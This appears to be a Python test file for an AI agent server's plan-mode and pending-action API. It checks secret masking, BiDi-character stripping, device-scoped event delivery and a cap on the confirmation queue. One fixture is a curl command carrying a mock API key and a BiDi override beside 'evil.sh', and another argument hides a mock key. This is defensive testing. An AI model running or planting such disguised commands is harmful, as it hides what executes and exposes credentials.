import json
from pathlib import Path
import tempfile
import threading
import time
import unittest
import urllib.request
import urllib.error
from unittest.mock import patch, MagicMock

import audit_logger
import plan_mode
import server


class TestPlanEventsAndPendingAPI(unittest.TestCase):
    def setUp(self):
        self.tmp_dir = tempfile.TemporaryDirectory()
        self.tmp_path = Path(self.tmp_dir.name)
        self.cfg = {
            "confirm_destructive": True,
            "provider": "openai",
            "api_key": "sk-mock-key-12345",
            "model": "gpt-4o",
            "monthly_budget_usd": 100.0,
            "remote_enabled": True,
        }
        with server.PENDING_LOCK:
            server.PENDING_ACTIONS.clear()
        with server.ACTIVE_PLANS_LOCK:
            server.ACTIVE_PLANS.clear()
        with server.LOCK:
            server.EVENTS.clear()
            server.EVENT_ID[0] = 0

    def tearDown(self):
        with server.PENDING_LOCK:
            server.PENDING_ACTIONS.clear()
        with server.ACTIVE_PLANS_LOCK:
            server.ACTIVE_PLANS.clear()
        server.Handler.DEFAULT_PORT = 8765
        self.tmp_dir.cleanup()

    def _start_live_server(self):
        srv = server.SilentThreadingHTTPServer(("127.0.0.1", 0), server.Handler)
        port = srv.server_address[1]
        server.Handler.DEFAULT_PORT = port
        t = threading.Thread(target=srv.serve_forever, daemon=True)
        t.start()
        return srv, port

    def _api_req(self, port, path, method="GET", body=None, cookie=None, token=None, auth_bearer=None):
        url = f"http://127.0.0.1:{port}{path}"
        headers = {
            "Host": f"127.0.0.1:{port}",
            "Origin": f"http://127.0.0.1:{port}",
            "Sec-Fetch-Site": "same-origin",
        }
        if cookie is not None:
            headers["Cookie"] = cookie
        if token is not None:
            headers["X-Nova-Token"] = token
        if auth_bearer is not None:
            headers["Authorization"] = f"Bearer {auth_bearer}"
        data = None
        if body is not None:
            headers["Content-Type"] = "application/json"
            data = json.dumps(body).encode("utf-8")
        req = urllib.request.Request(url, data=data, headers=headers, method=method)
        try:
            with urllib.request.urlopen(req, timeout=5) as resp:
                raw = resp.read().decode("utf-8", errors="replace")
                try:
                    return resp.status, json.loads(raw), dict(resp.headers)
                except Exception:
                    return resp.status, raw, dict(resp.headers)
        except urllib.error.HTTPError as e:
            raw = e.read().decode("utf-8", errors="replace")
            try:
                return e.code, json.loads(raw), dict(e.headers)
            except Exception:
                return e.code, raw, dict(e.headers)

    def test_item5_plan_events_masking_bidi_and_no_raw_command(self):
        """Plan events must carry only pending_id, action, sanitized+masked preview (<=200), pc_only, guardian, and NO raw command."""
        # Command containing OpenAI secret key and Unicode BiDi override (\u202e)
        secret_cmd = "curl -H 'Authorization: Bearer sk-proj-supersecretOpenAIKey123456789' \u202e evil.sh"
        plan_tag = f"SecretPlan\nCMD: {secret_cmd}\nNOTE: step2 | finish"

        res = server.run_skill(self.cfg, "PLAN", plan_tag, source="pc", mode="developer", conv_id="pc:developer")
        self.assertTrue(isinstance(res, dict) and res.get("paused"))

        with server.LOCK:
            paused_events = [e for e in server.EVENTS if e.get("type") == "plan_paused"]
            self.assertTrue(len(paused_events) >= 1)
            ev = paused_events[-1]

        # Verify event payload structure
        self.assertIn("pending_id", ev)
        self.assertIn("action", ev)
        self.assertIn("preview", ev)
        self.assertIn("pc_only", ev)
        self.assertIn("guardian", ev)

        # Must not contain raw command
        self.assertNotIn("command", ev)
        self.assertNotIn(secret_cmd, str(ev))

        # Secret must be masked
        self.assertNotIn("sk-proj-supersecretOpenAIKey123456789", ev["preview"])
        self.assertTrue("[MAS" in ev["preview"] or "[RED" in ev["preview"])

        # BiDi character must be sanitized / stripped
        self.assertNotIn("\u202e", ev["preview"])

        # Length must be <= 200 chars
        self.assertLessEqual(len(ev["preview"]), 200)

    def test_item5_do_not_deliver_plan_events_to_phone_unless_started_by_phone(self):
        """Plan events from PC must not be delivered to phone-remote clients via /api/events."""
        srv, port = self._start_live_server()
        try:
            # Register a paired phone device
            dev_token = "mock_phone_bearer_token_xyz"
            with server.PAIRED_DEVICES_LOCK:
                server.PAIRED_DEVICES["dev1"] = {
                    "id": "dev1",
                    "token": dev_token,
                    "name": "Test Phone",
                    "created_at": time.time(),
                    "last_seen": time.time(),
                    "client_ip": "127.0.0.1",
                }

            # Emit a PC plan event and a phone plan event
            server.add_event(type="plan_paused", source="pc", title="PCPlan", pending_id="p1", action="CMD", preview="npm test", pc_only=False, guardian="NONE")
            server.add_event(type="plan_paused", source="phone", title="PhonePlan", pending_id="p2", action="CMD", preview="echo hi", pc_only=False, guardian="NONE")
            server.add_event(type="system", source="pc", text="Normal system event")

            # 1. Phone client polls /api/events with Bearer token
            st_phone, body_phone, _ = self._api_req(port, "/api/events?after=0", auth_bearer=dev_token)
            self.assertEqual(st_phone, 200)
            events_phone = body_phone.get("events", [])
            types_phone = [e.get("title") for e in events_phone if e.get("type") == "plan_paused"]
            # Must NOT contain PCPlan! Only PhonePlan
            self.assertNotIn("PCPlan", types_phone)
            self.assertIn("PhonePlan", types_phone)

            # 2. Desktop PC client polls /api/events with desktop session cookie + token
            auth_cookie = f"nova_session={server.SESSION_TOKEN}"
            auth_token = server.API_SESSION_TOKEN
            st_pc, body_pc, _ = self._api_req(port, "/api/events?after=0", cookie=auth_cookie, token=auth_token)
            self.assertEqual(st_pc, 200)
            events_pc = body_pc.get("events", [])
            types_pc = [e.get("title") for e in events_pc if e.get("type") == "plan_paused"]
            self.assertIn("PCPlan", types_pc)
            self.assertIn("PhonePlan", types_pc)

        finally:
            srv.shutdown()
            srv.server_close()

    def test_item6_get_api_pending_endpoint_sanitization_no_secrets_and_refresh(self):
        """GET /api/pending returns sanitized and masked entries, no raw command, and filters correctly."""
        srv, port = self._start_live_server()
        try:
            auth_cookie = f"nova_session={server.SESSION_TOKEN}"
            auth_token = server.API_SESSION_TOKEN

            secret_arg = "python script.py --token sk-ant-api03-VerySecretAnthropicKey99999 \u202b test"
            server.create_pending_action(
                cfg=self.cfg,
                name="RUN_CODE",
                arg=secret_arg,
                source="pc",
                mode="developer",
                conv_id="pc:developer",
                reason="Testing pending API",
            )

            # Add another pending action for a different conversation
            server.create_pending_action(
                cfg=self.cfg,
                name="CMD",
                arg="echo tg_task",
                source="telegram",
                mode="developer",
                conv_id="telegram:9876",
                reason="Telegram task",
            )

            # 1. Query GET /api/pending without filter
            status, res, _ = self._api_req(port, "/api/pending", cookie=auth_cookie, token=auth_token)
            self.assertEqual(status, 200)
            self.assertTrue(res.get("ok"))
            pending_list = res.get("pending", [])
            self.assertEqual(len(pending_list), 2)

            run_code_entry = next((p for p in pending_list if p.get("action") == "RUN_CODE"), None)
            self.assertIsNotNone(run_code_entry)

            # Must NOT contain raw 'arg' or 'command'
            self.assertNotIn("arg", run_code_entry)
            self.assertNotIn("command", run_code_entry)

            # Must contain masked preview
            self.assertNotIn("sk-ant-api03-VerySecretAnthropicKey99999", run_code_entry["preview"])
            self.assertTrue("MASK" in run_code_entry["preview"] or "REDACTED" in run_code_entry["preview"] or "sk-***" in run_code_entry["preview"])
            self.assertNotIn("\u202b", run_code_entry["preview"])

            # 2. Query with ?conv_id=pc:developer filter
            st_f, res_f, _ = self._api_req(port, "/api/pending?conv_id=pc:developer", cookie=auth_cookie, token=auth_token)
            self.assertEqual(st_f, 200)
            filtered_list = res_f.get("pending", [])
            self.assertEqual(len(filtered_list), 1)
            self.assertEqual(filtered_list[0]["conv_id"], "pc:developer")

        finally:
            srv.shutdown()
            srv.server_close()

    def test_item7_pending_actions_cap_20_refuses_new_and_audits_never_evicts(self):
        """When 20 actions are pending, create_pending_action refuses new ones, audits, and never evicts silently."""
        with server.PENDING_LOCK:
            server.PENDING_ACTIONS.clear()

        # Create exactly 20 pending actions
        first_id = None
        for i in range(20):
            p_entry, p_info, err = server.create_pending_action(
                cfg=self.cfg,
                name="CMD",
                arg=f"echo step_{i}",
                source="pc",
                mode="developer",
                conv_id="pc:developer",
                reason=f"Step {i}",
            )
            if i == 0:
                first_id = p_info["id"]

        with server.PENDING_LOCK:
            self.assertEqual(len(server.PENDING_ACTIONS), 20)
            self.assertIn(first_id, server.PENDING_ACTIONS)

        # Attempt to create the 21st pending action
        with patch("audit_logger.log_audit_event") as mock_audit:
            p_entry_21, p_info_21, err_21 = server.create_pending_action(
                cfg=self.cfg,
                name="CMD",
                arg="echo step_21_overflow",
                source="pc",
                mode="developer",
                conv_id="pc:developer",
                reason="Overflow step",
            )
            self.assertIsNone(p_info_21)
            self.assertIn("Refused: Confirmation queue is full", err_21)

            # First item must NOT be evicted!
            with server.PENDING_LOCK:
                self.assertEqual(len(server.PENDING_ACTIONS), 20)
                self.assertIn(first_id, server.PENDING_ACTIONS)

            # Audit event must be logged
            mock_audit.assert_called()
            call_kw = mock_audit.call_args[1]
            self.assertEqual(call_kw.get("status"), "REFUSED_PENDING_QUEUE_FULL")


if __name__ == "__main__":
    unittest.main()
